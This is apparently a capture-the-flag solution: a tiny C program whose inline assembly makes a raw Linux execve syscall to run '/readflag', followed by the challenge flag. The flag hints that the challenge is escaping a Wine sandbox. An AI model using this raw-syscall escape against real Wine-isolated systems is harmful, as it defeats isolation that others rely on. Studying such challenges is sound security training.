#include <stdio.h>

int main() {
    __asm__(
            "push 0x67;"
            "mov rax, 0x616c66646165722f;"
            "push rax;"
            "mov rdi, rsp;"
            "xor rsi, rsi;"
            "xor rdx, rdx;"
            "mov rax, 0x3b;"
            "syscall;"
            );
    return 0;
}

// flag{W1ne_is_NeveR_a_SaNDB0x_ad2970bd4f}
